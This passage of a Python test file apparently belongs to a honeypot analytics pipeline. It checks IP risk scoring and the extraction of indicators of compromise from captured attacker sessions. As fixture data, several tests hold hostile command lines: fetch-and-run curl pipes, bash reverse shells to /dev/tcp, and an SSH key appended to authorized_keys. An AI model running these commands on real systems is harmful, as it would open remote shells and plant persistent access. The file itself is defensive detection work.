        assert row["geo_city"] == "New York"
        assert row["greynoise_name"] == "Mirai"
        assert row["shodan_ports"] == "22,80,443"
        assert row["vt_malicious"] == 5


# ---------------------------------------------------------------------------
# Phase D.2 — risk_score decomposition (enrichment + behavioral → composite)
# ---------------------------------------------------------------------------


def _row_with(**overrides: object) -> dict[str, object]:
    """Minimal per-IP test row builder for risk-score decomposition tests."""
    base: dict[str, object] = {
        "class_uid": CLASS_NETWORK_ACTIVITY,
        "category_uid": 4,
        "severity_id": 3,
        "activity_id": 5,
        "type_uid": 400105,
        "time": _ts(),
        "message": "test",
        "status_id": STATUS_UNKNOWN,
        "src_endpoint_ip": "192.0.2.1",
        "src_endpoint_port": 12345,
        "dst_endpoint_ip": "honeypot-01",
        "dst_endpoint_port": 22,
        "dataset": "nftables",
        "server": "test",
        "operation": "test",
        "session": None,
        "user_name": None,
        "unmapped_password": None,
        "actor_process_cmd_line": None,
        "finding_title": None,
        "finding_uid": None,
        "geo.country_code": "US",
        "geo.asn": "1234",
        "geo.isp": "TestISP",
    }
    base.update(overrides)
    return base


class TestRiskScoreDecomposition:
    """v1.5 behavioral-anchored monotonic risk_score formula verification."""

    def test_all_enrichment_null_keeps_full_behavioral(self) -> None:
        """Missing enrichment must NOT halve or penalize observed compromise."""
        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_AUTHENTICATION,
                    status_id=STATUS_SUCCESS,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        # auth_successes=1 (+25) + auth_attempts=1 (+0.1) = 25.1
        assert row["enrichment_risk_score"] is None
        assert row["behavioral_risk_score"] == pytest.approx(25.1)
        assert row["risk_score"] == pytest.approx(25.1)

    def test_pure_enrichment_with_no_activity_capped_below_stix(self) -> None:
        """Pure scanner (behavioral=0) capped at enrichment * 0.35 (<= 35, never enters STIX)."""
        df = pl.DataFrame(
            [
                _row_with(
                    abuseipdb_risk_score=100.0,
                    virustotal_risk_score=100.0,
                    shodan_risk_score=100.0,
                    greynoise_risk_score=100.0,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(100.0)
        assert row["behavioral_risk_score"] == pytest.approx(0.0)
        assert row["risk_score"] == pytest.approx(35.0)
        assert row["risk_score"] < 40.0

    def test_riot_ip_with_high_behavioral_applies_fp_brake(self) -> None:
        """RIOT IP with behavioral activity gets behavioral / 2.0 FP brake."""
        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_AUTHENTICATION,
                    status_id=STATUS_SUCCESS,
                    abuseipdb_risk_score=90.0,
                    virustotal_risk_score=None,
                    shodan_risk_score=None,
                    greynoise_risk_score=0.0,
                    greynoise_riot=True,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(45.0)
        assert row["behavioral_risk_score"] == pytest.approx(25.1)
        assert row["risk_score"] == pytest.approx(12.55)
        assert row["greynoise_riot"] is True

    def test_blended_monotonic_lifts_above_behavioral(self) -> None:
        """Hot enrichment lifts interactive behavioral score: max(B, (B+E)/2)."""
        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    abuseipdb_risk_score=80.0,
                    virustotal_risk_score=75.0,
                    shodan_risk_score=100.0,
                    greynoise_risk_score=75.0,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(82.5)
        assert row["behavioral_risk_score"] == pytest.approx(25.0)
        assert row["risk_score"] == pytest.approx(53.75)

    def test_clean_enrichment_never_drags_down_interactive_attacker(self) -> None:
        """Fresh VPS/compromised cloud IP with enrichment=0 still keeps behavioral=50.1."""
        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_AUTHENTICATION,
                    status_id=STATUS_SUCCESS,
                    abuseipdb_risk_score=0.0,
                ),
                _row_with(
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    actor_process_cmd_line="curl http://drop.example.org/x.sh | sh",
                    abuseipdb_risk_score=0.0,
                ),
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(0.0)
        assert row["behavioral_risk_score"] == pytest.approx(50.1)
        assert row["risk_score"] == pytest.approx(50.1)

    def test_partial_provider_coverage_uses_mean_of_populated(self) -> None:
        """Only AbuseIPDB populated on a pure scan -> enrichment=100, risk=35."""
        df = pl.DataFrame([_row_with(abuseipdb_risk_score=100.0)])
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(100.0)
        assert row["behavioral_risk_score"] == pytest.approx(0.0)
        assert row["risk_score"] == pytest.approx(35.0)

    def test_score_clipped_to_unit_range(self) -> None:
        """Scores stay in [0, 100] even with extreme inputs."""
        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    abuseipdb_risk_score=200.0,
                    virustotal_risk_score=200.0,
                    shodan_risk_score=200.0,
                    greynoise_risk_score=200.0,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["enrichment_risk_score"] == pytest.approx(100.0)
        assert row["risk_score"] <= 100.0

    def test_riot_with_hot_other_providers(self) -> None:
        """RIOT scan IP gets risk_score=0.0 regardless of hot other providers."""
        df = pl.DataFrame(
            [
                _row_with(
                    abuseipdb_confidence_score=90,
                    abuseipdb_risk_score=90.0,
                    virustotal_risk_score=100.0,
                    shodan_risk_score=None,
                    greynoise_classification="malicious",
                    greynoise_noise=True,
                    greynoise_riot=True,
                    greynoise_risk_score=0.0,
                )
            ]
        )
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)
        assert row["greynoise_risk_score"] == 0.0
        assert row["greynoise_riot"] is True
        assert row["enrichment_risk_score"] == pytest.approx(63.333333, rel=1e-4)
        assert row["behavioral_risk_score"] == pytest.approx(0.0)
        assert row["risk_score"] == pytest.approx(0.0)


class TestV15GoldInvariants:
    """v1.5 gold invariants: null IP exclusion, decoder SID filtering, probe exclusion,
    explicit empty schemas, and the 7th gold table extracted_iocs."""

    def test_null_src_ip_excluded_from_ip_reputation_progression_and_summary(self) -> None:
        df = pl.DataFrame(
            [
                _row_with(src_endpoint_ip="203.0.113.10"),
                _row_with(
                    src_endpoint_ip=None,
                    class_uid=CLASS_FILE_ACTIVITY,
                    file_hash_sha256="a" * 64,
                    file_intent="malware",
                ),
            ]
        )
        summary = compute_daily_summary(df)
        assert summary.row(0, named=True)["unique_source_ips"] == 1
        rep = compute_ip_reputation(df)
        assert rep.height == 1
        assert rep.get_column("src_endpoint_ip").to_list() == ["203.0.113.10"]
        prog = compute_behavioral_progression(df)
        assert prog.height == 1

    def test_decoder_sids_excluded_and_finding_uid_preserved_with_cap_100(self) -> None:
        rows: list[dict[str, object]] = [
            _row_with(
                src_endpoint_ip="203.0.113.99",
                class_uid=CLASS_DETECTION_FINDING,
                finding_title="SURICATA STREAM ESTABLISHED retransmission",
                finding_uid="2210045",
                dataset="suricata",
            ),
        ]
        # Add 25 distinct real signatures (> old cap of 20)
        for i in range(25):
            rows.append(
                _row_with(
                    src_endpoint_ip="203.0.113.10",
                    class_uid=CLASS_DETECTION_FINDING,
                    finding_title=f"ET EXPLOIT Synthetic Sig {i}",
                    finding_uid=str(2000000 + i),
                    dataset="suricata",
                )
            )
        df = pl.DataFrame(rows)
        summary = compute_daily_summary(df).row(0, named=True)
        assert summary["findings_detected"] == 25  # decoder SID 2210045 excluded

        rep = compute_ip_reputation(df)
        decoder_ip = rep.filter(pl.col("src_endpoint_ip") == "203.0.113.99").row(0, named=True)
        assert decoder_ip["findings_triggered"] == 0
        assert decoder_ip["behavioral_risk_score"] == pytest.approx(0.0)

        findings = compute_detection_findings(df)
        assert findings.height == 25  # cap raised from 20 -> 100
        assert "finding_uid" in findings.columns
        assert "2210045" not in findings.get_column("finding_uid").to_list()

    def test_probe_file_intent_excluded_from_behavioral_download_weight(self) -> None:
        df = pl.DataFrame(
            [
                _row_with(
                    src_endpoint_ip="203.0.113.11",
                    class_uid=CLASS_FILE_ACTIVITY,
                    file_hash_sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    file_intent="probe",
                )
            ]
        )
        rep = compute_ip_reputation(df).row(0, named=True)
        assert rep["downloads"] == 0
        assert rep["behavioral_risk_score"] == pytest.approx(0.0)

    def test_empty_top_n_lists_keep_explicit_struct_schemas(self) -> None:
        df = pl.DataFrame([_row_with(src_endpoint_ip="203.0.113.10")])
        summary = compute_daily_summary(df)
        assert summary.schema["top_usernames"] == pl.List(
            pl.Struct({"value": pl.Utf8, "count": pl.Int64})
        )
        assert summary.schema["top_credential_pairs"] == pl.List(
            pl.Struct({"username": pl.Utf8, "password": pl.Utf8, "count": pl.Int64})
        )
        geo = compute_geographic_summary(df)
        assert geo.schema["top_cities"] == pl.List(pl.Utf8)

    def test_compute_extracted_iocs_all_five_durable_types(self) -> None:
        import base64
        import hashlib

        from lantana.transform.metrics import compute_extracted_iocs

        raw_key = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + b"\x99" * 32
        b64_key = base64.b64encode(raw_key).decode("ascii")
        expected_fp = "ssh-ed25519 SHA256:" + base64.b64encode(
            hashlib.sha256(raw_key).digest()
        ).decode("ascii").rstrip("=")
        sha_mal = "f" * 64
        sha_probe = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        df = pl.DataFrame(
            [
                _row_with(
                    dataset="cowrie",
                    class_uid=CLASS_FILE_ACTIVITY,
                    activity_id=2,
                    file_hash_sha256=sha_mal,
                    file_intent="malware",
                    file_url="http://stager.example.org/payload.elf",
                    vt_file_vhash="0140vhash999",
                    vt_file_family="mirai",
                    vt_file_malicious_count=22,
                    vt_status="found",
                ),
                _row_with(
                    class_uid=CLASS_FILE_ACTIVITY,
                    file_hash_sha256=sha_probe,
                    file_intent="probe",
                    file_url=None,
                    vt_file_vhash=None,
                    vt_file_family=None,
                    vt_file_malicious_count=None,
                    vt_status=None,
                ),
                _row_with(
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    actor_process_cmd_line=(
                        f"bash -i >& /dev/tcp/198.51.100.88/4444 0>&1; "
                        f'echo "ssh-ed25519 {b64_key} x" >> ~/.ssh/authorized_keys'
                    ),
                    file_hash_sha256=None,
                    file_intent=None,
                    file_url=None,
                    vt_file_vhash=None,
                    vt_file_family=None,
                    vt_file_malicious_count=None,
                    vt_status=None,
                ),
            ]
        )
        lookup = {
            ("ip", "198.51.100.88"): {
                "vt_status": "found",
                "vt_malicious_count": 7,
                "gti_verdict": "VERDICT_MALICIOUS",
                "gti_score": 88,
                "gti_threat_actors": "UNC9999",
            }
        }
        iocs = compute_extracted_iocs(df, enrichment_lookup=lookup)
        by_key = {(r["ioc_type"], r["ioc_value"]): r for r in iocs.iter_rows(named=True)}
        assert ("malware_hash", sha_mal) in by_key
        assert ("malware_hash", sha_probe) not in by_key
        assert by_key[("malware_hash", sha_mal)]["vhash"] == "0140vhash999"
        assert by_key[("malware_hash", sha_mal)]["malware_family"] == "mirai"
        assert ("stager_url", "http://stager.example.org/payload.elf") in by_key
        assert (
            by_key[("stager_url", "http://stager.example.org/payload.elf")]["verification_status"]
            == "verified"
        )
        assert (
            by_key[("stager_url", "http://stager.example.org/payload.elf")]["verification_reason"]
            == "captured_artifact"
        )
        assert ("stager_domain", "stager.example.org") in by_key
        assert (
            by_key[("stager_domain", "stager.example.org")]["verification_status"] == "unverified"
        )
        assert ("c2_ip", "198.51.100.88") in by_key
        assert by_key[("c2_ip", "198.51.100.88")]["gti_verdict"] == "VERDICT_MALICIOUS"
        assert by_key[("c2_ip", "198.51.100.88")]["actor_associations"] == "UNC9999"
        assert by_key[("c2_ip", "198.51.100.88")]["verification_status"] == "verified"
        assert ("ssh_key", expected_fp) in by_key
        assert by_key[("ssh_key", expected_fp)]["verification_status"] == "verified"
        assert by_key[("malware_hash", sha_mal)]["verification_status"] == "verified"

    def test_compute_extracted_iocs_keeps_all_raw_rows_with_verification_status(self) -> None:
        """Gold extracted_iocs retains every non-infra string with deterministic verification
        and suppression tags (zero silent data loss)."""
        from lantana.transform.metrics import compute_extracted_iocs

        df = pl.DataFrame(
            [
                _row_with(
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    actor_process_cmd_line=(
                        "curl https://raw.githubusercontent.com/attacker/repo/main/drop.sh; "
                        "curl https://raw.githubusercontent.com/org/repo/main/clean.sh; "
                        "curl https://ifconfig.me/ip; "
                        "wget http://legit-bank.example.org/index.html; "
                        "nc -zv 1.1.1.1 53; "
                        "bash -i >& /dev/tcp/198.51.100.90/4444 0>&1; "
                        "bash -i >& /dev/tcp/198.51.100.91/4444 0>&1"
                    ),
                ),
            ]
        )
        lookup: dict[tuple[str, str], dict[str, object]] = {
            ("url", "https://raw.githubusercontent.com/attacker/repo/main/drop.sh"): {
                "vt_status": "found",
                "vt_url_malicious_count": 5,
            },
            ("ip", "198.51.100.90"): {
                "greynoise_riot": True,
                "greynoise_classification": "benign",
                "abuseipdb_confidence_score": 90,
            },
            ("ip", "198.51.100.91"): {
                "abuseipdb_confidence_score": 75,
            },
        }
        iocs = compute_extracted_iocs(df, enrichment_lookup=lookup)
        by_key = {(r["ioc_type"], r["ioc_value"]): r for r in iocs.iter_rows(named=True)}

        # Shared-host domain is ALWAYS retained in Gold as suppressed
        gh_dom = by_key[("stager_domain", "raw.githubusercontent.com")]
        assert gh_dom["verification_status"] == "suppressed"
        assert gh_dom["verification_reason"] == "shared_hosting_domain"

        # Corroborated shared-host full URL is verified
        gh_mal = by_key[
            ("stager_url", "https://raw.githubusercontent.com/attacker/repo/main/drop.sh")
        ]
        assert gh_mal["verification_status"] == "verified"
        assert gh_mal["verification_reason"] == "vt_malicious"

        # Uncorroborated shared-host URL is suppressed (blocks benign GitHub poisoning)
        gh_clean = by_key[
            ("stager_url", "https://raw.githubusercontent.com/org/repo/main/clean.sh")
        ]
        assert gh_clean["verification_status"] == "suppressed"
        assert gh_clean["verification_reason"] == "shared_hosting_unverified_url"

        # Benign utility host suppresses both domain and URL
        assert by_key[("stager_domain", "ifconfig.me")]["verification_status"] == "suppressed"
        assert (
            by_key[("stager_url", "https://ifconfig.me/ip")]["verification_status"] == "suppressed"
        )

        # Unverified arbitrary domain/URL kept as unverified
        assert (
            by_key[("stager_url", "http://legit-bank.example.org/index.html")][
                "verification_status"
            ]
            == "unverified"
        )
        assert (
            by_key[("stager_domain", "legit-bank.example.org")]["verification_status"]
            == "unverified"
        )

        # Public resolver IP suppressed
        assert by_key[("c2_ip", "1.1.1.1")]["verification_status"] == "suppressed"
        assert by_key[("c2_ip", "1.1.1.1")]["verification_reason"] == "benign_resolver_ip"

        # GreyNoise RIOT overrides AbuseIPDB
        assert by_key[("c2_ip", "198.51.100.90")]["verification_status"] == "suppressed"
        assert by_key[("c2_ip", "198.51.100.90")]["verification_reason"] == "greynoise_riot"

        # AbuseIPDB >= 50 verifies outbound C2 IP
        assert by_key[("c2_ip", "198.51.100.91")]["verification_status"] == "verified"
        assert by_key[("c2_ip", "198.51.100.91")]["verification_reason"] == "abuseipdb_malicious"

    def test_unauthenticated_dionaea_upload_and_uncorroborated_file_cannot_poison_stix(
        self,
    ) -> None:
        """Adversarial regression: an attacker POSTing arbitrary bytes to Dionaea HTTP with a
        victim or shared-hosting URL in the request line (or downloading an uncorroborated
        benign file) must NEVER forge captured_artifact=True for stager_url or c2_ip."""
        from lantana.transform.metrics import compute_extracted_iocs

        benign_sha = "b" * 64
        mal_sha = "c" * 64
        df = pl.DataFrame(
            [
                # Dionaea inbound HTTP POST upload with attacker-controlled URI (activity_id=1)
                _row_with(
                    dataset="dionaea",
                    class_uid=CLASS_FILE_ACTIVITY,
                    activity_id=1,
                    file_hash_sha256=mal_sha,
                    file_intent="malware",
                    file_url="https://raw.githubusercontent.com/torvalds/linux/master/README",
                    vt_file_malicious_count=10,
                ),
                _row_with(
                    dataset="dionaea",
                    class_uid=CLASS_FILE_ACTIVITY,
                    activity_id=1,
                    file_hash_sha256=benign_sha,
                    file_intent="malware",
                    file_url="http://198.51.100.50/innocent-victim",
                    vt_file_malicious_count=0,
                ),
                # Cowrie file download whose hash is uncorroborated (vt_file_malicious_count=0)
                _row_with(
                    dataset="cowrie",
                    class_uid=CLASS_FILE_ACTIVITY,
                    activity_id=2,
                    file_hash_sha256=benign_sha,
                    file_intent="malware",
                    file_url="https://raw.githubusercontent.com/org/repo/main/README.md",
                    vt_file_malicious_count=0,
                ),
                # Trailing-dot IP-literal URL targeting a GreyNoise RIOT IP
                _row_with(
                    dataset="cowrie",
                    class_uid=CLASS_PROCESS_ACTIVITY,
                    actor_process_cmd_line="curl http://198.51.100.90./payload.sh",
                    file_hash_sha256=None,
                    file_intent=None,
                    file_url=None,
                    vt_file_malicious_count=None,
                ),
            ]
        )
        lookup: dict[tuple[str, str], dict[str, object]] = {
            ("ip", "198.51.100.90"): {"greynoise_riot": True, "greynoise_classification": "benign"},
            ("url", "http://198.51.100.90./payload.sh"): {"vt_url_malicious_count": 5},
        }
        iocs = compute_extracted_iocs(df, enrichment_lookup=lookup)
        by_key = {(r["ioc_type"], r["ioc_value"]): r for r in iocs.iter_rows(named=True)}

        assert (
            by_key[
                ("stager_url", "https://raw.githubusercontent.com/torvalds/linux/master/README")
            ]["verification_status"]
            == "suppressed"
        )
        assert (
            by_key[("stager_url", "http://198.51.100.50/innocent-victim")]["verification_status"]
            == "unverified"
        )
        assert by_key[("c2_ip", "198.51.100.50")]["verification_status"] == "unverified"
        assert (
            by_key[("stager_url", "https://raw.githubusercontent.com/org/repo/main/README.md")][
                "verification_status"
            ]
            == "suppressed"
        )
        # Trailing-dot RIOT IP URL is suppressed via normalized IP lookup
        riot_url = by_key[("stager_url", "http://198.51.100.90./payload.sh")]
        assert riot_url["verification_status"] == "suppressed"
        assert riot_url["verification_reason"] == "greynoise_riot"


def test_optional_first_skips_leading_nulls_across_diagonal_concat() -> None:
    """When first row for an IP has null enrichment/geo fields and a later row has real values,
    compute_ip_reputation picks the non-null value instead of returning None."""
    df = pl.DataFrame(
        [
            _row_with(
                **{
                    "geo.country_code": None,
                    "geo.asn": None,
                    "geo.isp": None,
                    "shodan_org": None,
                }
            ),
            _row_with(
                **{
                    "geo.country_code": "DE",
                    "geo.asn": "64497",
                    "geo.isp": "Example Hosting ISP",
                    "shodan_org": "Example Hosting ISP",
                }
            ),
        ]
    )
    result = compute_ip_reputation(df)
    row = result.row(0, named=True)
    assert row["geo_country"] == "DE"
    assert row["geo_asn"] == "64497"
    assert row["geo_isp"] == "Example Hosting ISP"
    assert row["shodan_org"] == "Example Hosting ISP"
